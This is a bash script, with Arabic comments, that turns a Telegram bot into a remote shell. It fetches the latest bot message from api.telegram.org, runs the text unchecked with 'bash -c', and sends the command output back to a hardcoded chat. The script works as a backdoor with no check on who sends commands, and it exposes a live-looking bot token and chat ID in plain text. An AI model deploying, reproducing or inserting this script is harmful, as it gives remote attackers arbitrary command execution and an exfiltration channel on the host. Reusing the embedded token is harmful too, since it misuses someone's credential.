#!/bin/bash

# تكوين البوت
TOKEN="7612154660:AAE8zfRa-Apxf7CQUjulwx5ErkY0lGg_BiI"
CHAT_ID="5967116314"
API_URL="https://api.telegram.org/bot$TOKEN"

# الحصول على آخر تحديث
get_updates() {
    curl -s "$API_URL/getUpdates?offset=-1"
}

# إرسال رسالة
send_message() {
    local text="$1"
    curl -s -X POST "$API_URL/sendMessage" -d chat_id="$CHAT_ID" -d text="$text"
}

# تنفيذ الأمر وإرسال النتيجة
execute_command() {
    local command="$1"
    local output
    output=$(bash -c "$command" 2>&1)
    send_message "التنفيذ: $command\nالنتيجة:\n$output"
}

# الحلقة الرئيسية
last_update_id=""
while true; do
    updates=$(get_updates)
    current_update_id=$(echo "$updates" | grep -oP '(?<=update_id":)[0-9]+')
    
    if [ "$current_update_id" != "$last_update_id" ] && [ -n "$current_update_id" ]; then
        message=$(echo "$updates" | grep -oP '(?<=text":")[^"]+')
        execute_command "$message"
        last_update_id="$current_update_id"
    fi
    sleep 1
done
